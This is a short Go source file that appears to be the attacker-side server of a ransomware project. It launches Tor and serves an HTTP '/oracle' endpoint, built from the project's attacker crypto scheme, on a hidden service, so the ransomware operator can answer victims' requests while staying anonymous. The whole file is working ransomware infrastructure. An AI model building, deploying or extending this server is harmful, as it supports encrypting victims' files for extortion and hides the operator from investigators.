package main

import (
    "os"
    "log"
    "net/http"

    "github.com/julienschmidt/httprouter"
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
)

func main() {
    go setup()
    <-signalListener()
    log.Println("Exiting")
}

func setup() {
    // start tor in the background
    tor := exe.NewTor("", os.Getenv("FLUTORRC"))

    log.Println("Starting tor")
    err := tor.Start()
    if err != nil {
        log.Fatal(err)
    }
    defer tor.Close()

    // http router config
    router := httprouter.New()
    router.Handler("GET", "/oracle", attacker.NewOracle())

    // start server
    log.Println("Listening on localhost at :9999 and :80 on the hidden service")
    log.Fatal(http.ListenAndServe(":9999", loggingMiddleware(router)))
}

func loggingMiddleware(next http.Handler) http.Handler {
    handler := func(w http.ResponseWriter, r *http.Request) {
        log.Printf("%s\t%s\t%s\n", r.RemoteAddr, r.Method, r.RequestURI)
        next.ServeHTTP(w, r)
    }
    return http.HandlerFunc(handler)
}
